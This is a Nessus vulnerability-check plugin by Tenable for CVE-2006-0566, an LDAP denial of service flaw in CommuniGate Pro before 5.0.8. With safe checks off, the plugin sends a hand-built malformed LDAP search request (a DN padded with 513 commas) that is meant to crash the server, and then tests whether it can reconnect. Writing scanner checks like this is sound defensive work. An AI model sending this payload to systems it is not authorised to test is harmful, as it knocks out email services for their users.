#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote application is prone to denial of service attacks. 

Description :

The remote host appears to be running CommuniGate Pro, a commercial
email and groupware application. 

The version of CommuniGate Pro installed on the remote host includes
an LDAP server that fails to handle requests with DNs that contain too
many elements.  A user can leverage this issue to crash not just the
LDAP server but also the entire application on the remote host. 

See also :

http://lists.grok.org.uk/pipermail/full-disclosure/2006-February/041941.html
http://www.stalker.com/CommuniGatePro/History.html

Solution :

Upgrade to CommuniGate Pro version 5.0.8 or later. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:N/A:P/B:N)";


if (description) {
  script_id(20889);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-0566");
  script_bugtraq_id(16501);
  script_xref(name:"OSVDB", value:"22932");

  script_name(english:"Communigate Pro < 5.0.8 LDAP Module Denial of Service Vulnerability");
  script_summary(english:"Checks for denial of service vulnerability in Communigate Pro < 5.0.8 LDAP module");
 
  script_description(english:desc);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("find_service2.nasl", "ldap_detect.nasl");
  script_require_ports("Services/smtp", 25, "Services/ldap", 389);

  exit(0);
}


include("smtp_func.inc");


ldap_port = get_kb_item("Services/ldap");
if (!ldap_port) ldap_port = 389;
if (!get_port_state(ldap_port)) exit(0);


smtp_port = get_kb_item("Services/smtp");
if (!smtp_port) smtp_port = 25;
if (!get_port_state(smtp_port)) exit(0);
banner = get_smtp_banner(port:smtp_port);


# Unless we're paranoid, make sure the SMTP banner looks like CommuniGate Pro.
if (report_paranoia < 2) {
  if (!banner || "ESMTP CommuniGate Pro" >!< banner) exit(0);
}


# If safe checks are enabled...
if (safe_checks()) {
  # Check the version number in the SMTP banner.
  if (
    banner && 
    egrep(pattern:"^220 .* CommuniGate Pro ([0-4]\.|5\.0\.[0-7])", string:banner)
  ) {
    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Nessus has determined the flaw exists with the application\n",
      "simply by looking at the version in the SMTP banner.\n"
    );

    security_note(port:ldap_port, data:report);
    exit(0);
  }
}
# Otherwise try to crash it.
else {
  # A bad request.
  req = raw_string(
    0x30,                              # universal sequence
    0x82, 0x02, 0x38,                  # length of the request
    0x02, 0x01, 0x01,                  # message id (1)
    0x63,                              # search request
    0x82, 0x02, 0x31,                  #   length
    0x04, 0x82, 0x02, 0x15,            #   search term
      "dc=", crap(data:",", length:513), 
      "dc=example,dc=com",
    0x0a, 0x01, 0x02,                  #   scope (subtree)
    0x0a, 0x01, 0x00,                  #   dereference (never)
    0x02, 0x01, 0x00,                  #   size limit (0)
    0x02, 0x01, 0x00,                  #   time limit (0)
    0x01, 0x01, 0x00,                  #   attributes only (false)
    0xa2, 0x05, 0x87, 0x03,            #   filter (!(foo=*))
      "foo", 0x30, 0x00
  );

  # Open a socket and send the request.
  soc = open_sock_tcp(ldap_port);
  if (soc) {
    send(socket:soc, data:req);
    res = recv(socket:soc, length:1024);
    close(soc);

    # If we didn't get anything back, check whether it crashed.
    if (res == NULL) {
      soc2 = open_sock_tcp(ldap_port);
      # There's a problem if we can't reconnect.
      if (!soc2) {
        security_note(ldap_port);
        exit(0);
      }
      else close(soc2);
    }
    close(soc);
  }
}

